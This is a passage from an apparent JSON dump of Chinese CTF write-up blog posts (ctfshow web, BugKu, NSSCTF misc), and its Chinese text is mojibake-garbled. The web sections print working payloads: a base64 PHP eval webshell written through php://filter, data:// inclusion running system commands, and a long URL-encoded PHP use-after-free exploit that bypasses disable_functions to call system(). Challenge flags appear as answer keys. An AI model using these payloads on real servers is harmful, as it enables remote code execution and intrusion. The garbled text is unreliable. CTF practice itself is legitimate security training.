ï¼ˆè¿™é‡Œå› ä¸ºæˆ‘ä»¬éœ€è¦çš„æ˜¯å†™å…¥çš„æƒé™ï¼Œæ‰€ä»¥æ˜¯writeï¼‰è¿›è¡Œä¸¤æ¬¡urlç¼–ç ï¼Œå¾—åˆ°å¦‚ä¸‹\n\n%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%33%32%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30\n~~~\nç„¶åå†contentå†™å…¥ç»è¿‡base64ç¼–ç è¿‡åçš„ä¸€å¥è¯ ï¼ˆPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==ï¼‰\nè¿™é‡Œcontentçš„å€¼å‰é¢è¦åŠ ä¸¤ä¸ªå­—ç¬¦ï¼Œå› ä¸ºbase64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œæ‰€ä»¥ç»™ä»–å¢åŠ 2ä¸ªå­—ç¬¦ ä¸€å…±8ä¸ªå­—ç¬¦\n![](/pic/87.1.png)\n![](/pic/87.2.png)\nç„¶åå†æŸ¥çœ‹fl0g.phpå°±è¡Œäº†\n# web88\n![](/pic/88.png)\nè¿‡æ»¤çš„ä¸œè¥¿å¾ˆå¤šï¼Œä½†dataåè®®è¿˜å¯ä»¥ç”¨ã€‚\n~~~\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgKi5waHAiKTs/Pg\n~~~\nbase64åé¢æ˜¯base64ç¼–ç ä½†æ˜¯ä¸èƒ½å¸¦æœ‰åŠ å·å’Œç­‰å·ï¼Œæœ‰åŠ å·çš„payloadä¸èƒ½ç”¨ã€‚\n# web116å’Œweb117\nä¸ä¼šåš.....","tags":["ctfshow","åˆ·é¢˜","æ–‡ä»¶åŒ…å«"],"categories":["ctfshow","åˆ·é¢˜","æ–‡ä»¶åŒ…å«"]},{"title":"BugKuåˆ·é¢˜","url":"/2023/01/28/BugKuåˆ·é¢˜/","content":"# èªæ˜çš„å°ç¾Š\né¢˜ç›®æè¿°ï¼šä¸€åªå°ç¾Šç¿»è¿‡äº†2ä¸ªæ …æ  fa{fe13f590lg6d46d0d0}\næ …æ å¯†ç ï¼Œåˆ†ä¸¤æ æ—¶å°±æ˜¯flagã€‚\n<!--more-->\nflag:`flag{6fde4163df05d900}`\n# /.-\né¢˜ç›®æè¿°ï¼š ..-./.-../.-/--./----.--/-../...--/..-./-.-./-.../..-./.----/--.../..-./----./...--/----./----./...../-----/....-/-----.-\nå¾ˆæ˜æ˜¾çš„æ‘©æ–¯å¯†ç ï¼Œ[åœ¨çº¿æ‘©æ–¯å¯†ç ç¿»è¯‘](https://www.lddgo.net/encrypt/morse)ï¼Œå¯ä»¥è§£å‡ºflagï¼šFLAG%u7bD3FCBF17F9399504%u7d\n%u7bæ˜¯{ï¼Œ%u7dæ˜¯}ï¼Œç„¶åå­—æ¯å…¨éƒ¨æ”¹ä¸ºå°å†™å°±æ˜¯flagã€‚\nflag:`flag{d3fcbf17f9399504}`\n# ok\né¢˜ç›®æ˜¯okkç¼–ç ï¼Œç”¨[](https://www.splitbrain.org/services/ook)å¯ä»¥ç›´æ¥è·å¾—flagã€‚\nflagï¼š`flag{0a394df55312c51a}`\n# linux\nä¸‹è½½æ–‡ä»¶è§£å‹ï¼Œç”¨è®°äº‹æœ¬çš„å½¢å¼æ‰“å¼€æ–‡ä»¶ï¼Œctrl+æœç´¢keyå°±èƒ½æ‰¾åˆ°flagã€‚\nflag:`key{feb81d3834e2423c9903f4755464060b}`\n# é—ªçš„å¥½å¿«\nä¸‹è½½æ˜¯ä¸€ä¸ªgifå›¾ï¼Œç”¨stegsolveæ‰“å¼€ï¼Œä¸€å¸§ä¸€å¸§æ‰«äºŒç»´ç ï¼Œç„¶åæ‹¼æ¥èµ·æ¥å°±æ˜¯flagã€‚\nflagï¼š`SYC{F1aSh_so_f4sT}`\n#  éšå†™2\nå›¾ç‰‡çš„å¤§å°æ„Ÿè§‰å’Œä»–æœ¬èº«æœ‰ç‚¹ä¸ç¬¦ï¼Œç”¨binwalkä¸€çœ‹ï¼Œç¡®å®æœ‰éšè—çš„æ–‡ä»¶ã€‚\nåˆ†ç¦»ä¹‹åæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…å’Œä¸€ä¸ªæç¤ºï¼Œæç¤ºè¯´æ˜è§£å‹å¯†ç æ˜¯ä¸‰ä½æ•°å­—ã€‚\næš´åŠ›ç ´è§£ä¸€ä¸‹ï¼Œå¯†ç æ˜¯871ï¼Œè§£å‹ä¹‹ååˆæ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œæœ«å°¾æœ‰`f1@g{eTB1IEFyZSBhIGhAY2tlciE=}`\nbase64è§£ç å¾—åˆ°falgã€‚\nflagï¼š`f1@g{y0u Are a h@cker!}`\n# ç™½å“¥çš„é¸½å­\nç”¨stegsolveæ‰“å¼€ï¼Œfileformatæœ€ä¸‹é¢æœ‰ç±»ä¼¼äºflagçš„æ–‡å­—ã€‚[æ …æ å¯†ç åœ¨çº¿åŠ å¯†è§£å¯†](http://moersima.00cha.net/shanlan.asp)æ …æ åŠ å¯†ï¼Œ\nå½“æ …æ æ•°ä¸º3æ—¶ï¼Œå°±æ˜¯flagã€‚\nflagï¼š`flag{w22_is_v3ry_cool}`\n# å†ä¹Ÿæ²¡æœ‰çº¯ç™½çš„çµé­‚\næ–‡ä»¶å¼€å¤´æ˜¯~å‘œå—·å¼€å¤´çš„ï¼ŒæŸ¥è¿‡ä¹‹åæ‰å‘ç°æ˜¯å…½éŸ³å¯†æ–‡[](https://roar.iiilab.com/)ã€‚ç”±äºä¸çŸ¥é“æ€ä¹ˆåŠ å¯†çš„ï¼Œå°±å…ˆå°†flagåŠ å¯†ä¸€ä¸‹è¯•è¯•ï¼Œç„¶åä¸€ä¸€å¯¹åº”ï¼Œæœ€å‘äººçš„æ˜¯å°‘äº†ä¸€ä¸ªGï¼ŒçœŸçš„æ¶å¿ƒäººã€‚ã€‚ã€‚ã€‚\næœ€åè§£å‡ºæ¥å°±æ˜¯flagã€‚\nflagï¼š`flag{ni-zhen-shi-shou-ren}`","tags":["åˆ·é¢˜","BugKu"],"categories":["BugKu","åˆ·é¢˜"]},{"title":"ctfshow webå…¥é—¨69~74","url":"/2023/01/25/ctfshow-webå…¥é—¨69~74/","content":"# web69\nå’Œweb68ä¸€æ ·ã€‚\npayload:\n~~~\nc=include(\"/flag.txt\");\n~~~\n<!--more-->\n# web70\nåŒä¸Šã€‚\n# web71\n![](/pic/71.png)\n~~~\n$s = ob_get_contents();//å¾—åˆ°ç¼“å†²åŒºçš„æ•°æ®ã€‚\nob_end_clean();//ä¼šæ¸…é™¤ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¹¶å°†ç¼“å†²åŒºå…³é—­ï¼Œä½†ä¸ä¼šè¾“å‡ºå†…å®¹ã€‚å¯ä»¥ç”¨exit();åœæ­¢åé¢çš„ç¨‹åºã€‚\n~~~\npayload:\n~~~\nc=include(\"/flag.txt\");exit();\n~~~\n# web72\n![](/pic/72.png)\nè¿™é“é¢˜è¿‡æ»¤äº†æ•°å­—å’Œå­—æ¯ï¼Œä¸ä¼šä¸€ç‚¹ä¸ä¼šã€‚\nå‚è€ƒä¸€ä¸‹å¤§ä½¬çš„wp\n[](https://rolemee.com/2021/07/16/ctfshow-web-ru-men-ming-ling-zhi-xing-72-rao-guo-disable-function-xian-zhi-he-open-basedir-xian-zhi/)\nå°†\n~~~\nc=?><?php\n$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n}\nexit(0);\n?>\n~~~\nè¿›è¡Œ`urlç¼–ç `ã€‚\n~~~\nc=?%3E%3C?php%0A$a=new%20DirectoryIterator(%22glob:///*%22);%0Aforeach($a%20as%20$f)%0A%7Becho($f-%3E__toString().'%20');%0A%7D%0Aexit(0);%0A?%3E\n~~~\n![](/pic/72.png)\nçœ‹åˆ°äº†`flag0.txt`,ä½†æ˜¯ç›´æ¥includeçš„è¯æ²¡æœ‰æƒé™ã€‚\nè¦ç”¨ä»€ä¹ˆuafç»•è¿‡\npayload:\n~~~\nc=function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B'args'%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20'WIN'))%20%7B%0A%20%20%20%20%20%20%20%20die('This%20PoC%20is%20for%20*nix%20systems%20only.')%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%0A%20%20%20%20trigger_uaf('x')%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B'args'%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E\n~~~\nå¾—åˆ°flag\n# web73\n![](/pic/73.png)\nglobéå†ç›®å½•ï¼Œæ¶¨çŸ¥è¯†äº†ã€‚\n~~~\nc=?><?php\n\t$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n}\nexit(0);\n?>\n~~~\nè¦è¿›è¡Œurlç¼–ç \n![](/pic/73.png)\nå‘ç°äº†`flagc.txt`\npayload:\n~~~\nc=include(\"/flagc.txt\");exit();\n~~~\n\n# web74\nè¿˜æ˜¯åŒæ ·çš„æ­¥éª¤ï¼Œglobéå†ç›®å½•\nflagåœ¨flagx.txté‡Œ\npayloadï¼š\n~~~\nc=include(\"/flagx.txt\");exit();\n~~~","tags":["ctfshow","åˆ·é¢˜","web"],"categories":["web","ctfshow","åˆ·é¢˜"]},{"title":"NSSCTF MISCåˆ·é¢˜","url":"/2023/01/24/NSSCTF-MISCåˆ·é¢˜/","content":"# [SWPUCTF 2021 æ–°ç”Ÿèµ›]æˆ‘çš„é“¶è¡Œå¡å¯†ç \n![](/pic/æˆ‘çš„é“¶è¡Œå¡å¯†ç .png)\nå‹ç¼©åŒ…æœ‰å¯†ç ï¼Œè€Œä¸”æ˜¯6ä½æ•°ã€‚ç”¨ARCHPRç ´è§£ï¼Œå¯†ç æ˜¯`768521`ã€‚\n<!--more-->\nè§£å‹ä¹‹åæ˜¯ä¸€ä¸ªmdæ–‡ä»¶\n![](/pic/pwd.png)\nç›´æ¥å°±æ‡µäº†ï¼Œçœ‹åˆ«äººçš„wpåå‘ç°æ˜¯ç”¨æ‰‹æœºçš„ä¹å®«æ ¼è§£å¯†çš„ï¼Œè¿˜æ˜¯å†™çš„å°‘ï¼Œæ¶¨çŸ¥è¯†äº†ã€‚\nè§£å‡ºæ¥ä¹‹åæ˜¯`YLOPJOGJVOCCYNMZYPGXGPOGJDVIGATBASH`\nåé¢çš„`ATBASH`å°±æ˜¯æç¤º\nå°†`YLOPJOGJVOCCYNMZYPGXGPOGJDVIG`è¿›è¡ŒATBASHè§£å¯†ï¼Œå¾—åˆ°`BOLKQLTQELXXBMNABKTCTKLTQWERT`ï¼Œåé¢çš„`QWERT`å°±æ˜¯QWERTåŠ å¯†ï¼Œä¹Ÿæ˜¯ä¸ªæç¤ºã€‚\nå°†`BOLKQLTQELXXBMNABKTCTKLT`è¿›è¡ŒQWERTè§£å¯†ï¼Œå¾—åˆ°`XISRASEACSUUXZYKXREVERSE`,åé¢çš„reverseè¿˜æ˜¯ä¸ªæç¤ºå¾—åˆ°`XKYZXUUSCAESARSIX`,caesar sixä¹Ÿæ˜¯ä¸ªæç¤ºå‡¯æ’’å¯†ç 6ï¼Œå¾—åˆ°`RESTROOM`ï¼Œæœ€ååœ¨RESERVEä¸€ä¸‹`NSSCTF{moortser}`å°±æ˜¯flagã€‚\n# [SWPU 2019]æ¼‚æµè®°çš„é©¬é‡Œå¥¥\nç‚¹å¼€exeæ–‡ä»¶å‡ºç°ä¸€ä¸ª1.txt\n![](/pic/maliao.png)\næç¤ºæ˜¯ntfsï¼Œå¯ä»¥ç”¨`NtfsStreamsEditor2`\næˆ–è€…\nè†œæ‹œxennyå¤§ä½¬\ncmdè½¬åˆ°æ–‡ä»¶åœ°å€ï¼Œå‘½ä»¤è¡Œnotepad 1.txt:flag.txt\næœ€åçš„flagæ˜¯`NSSCTF{ddg_is_cute}`\n# [SWPUCTF 2021 æ–°ç”Ÿèµ›]gifå¥½åƒæœ‰ç‚¹å¤§\nä¸‹è½½æ–‡ä»¶åæ˜¯ä¸ªGIFå›¾ï¼Œç”¨`STEG SOLVE`æ‰“å¼€ï¼Œåœ¨ç¬¬562å¸§çš„æ—¶å€™æœ‰ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«ç å°±æ˜¯flag `NSSCTF{The_G1F_ls_T00_b1g}`\n# [HUBUCTF 2022 æ–°ç”Ÿèµ›]æœ€ç®€å•çš„misc\nç”¨`stegsolve`æ‰“å¼€ï¼ŒLSBéšå†™ï¼Œå¾—åˆ°ä¸€ä¸ªäºŒç»´ç ï¼Œç„¶åæ‰«ç ä¹‹åå°±æ˜¯flag:`NSSCTF{aacc4238460996f0178c18d7637c9dd5}`\n\n\n\n\nå”‰ï¼miscé¢˜å†™çš„æ¶å¿ƒï¼Œå°±æ˜¯è·Ÿä½œè€…å¯¹è„‘ç”µæ³¢å˜›ã€‚","tags":["åˆ·é¢˜","MISC","NSSCTF"],"categories":["MISC","NSSCTF","åˆ·é¢˜"]},{"title":"ctfshow webå…¥é—¨57~68","url":"/2023/01/22/ctfshow-webå…¥é—¨57/","content":"# web57\n![](/pic/57.png)\né¢˜ç›®æ˜¾ç¤ºflagåœ¨36.phpä¸­ï¼Œè€Œä¸”ç»™å‡ºcatå’Œphpäº†ï¼Œåªè¦æƒ³åŠæ³•æ„é€ å‡º36å°±å¯ä»¥äº†ã€‚\n`$(())`æ˜¯åšè¿ç®—ï¼Œ`$((${_}))=0`,æ‰€ä»¥åªè¦æ‹¼æ¥é™¤-36ä¹‹åå–åå°±è¡Œ\npayload:\n~~~\n?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\n~~~\n<!--more-->\n# web58\n![](/pic/web58.png)\né¢˜å¾ˆçŸ­ï¼Œä½†æ˜¯æˆ‘ä¸ä¼šã€‚ã€‚ã€‚\nå‚è€ƒæ–‡ç« [](https://blog.csdn.net/miuzzx/article/details/108619930)\npayloadå¤ªå¤šäº†\n~~~\nc=show_source(\"flag.php\");\n~~~\n# web59\nå’Œweb58å·®ä¸å¤šã€‚\npayloadï¼š\n~~~\nc=show_source(\"flag.php\");\n~~~\n# web60\nå’Œå‰ä¸¤é“é¢˜ä¸€æ 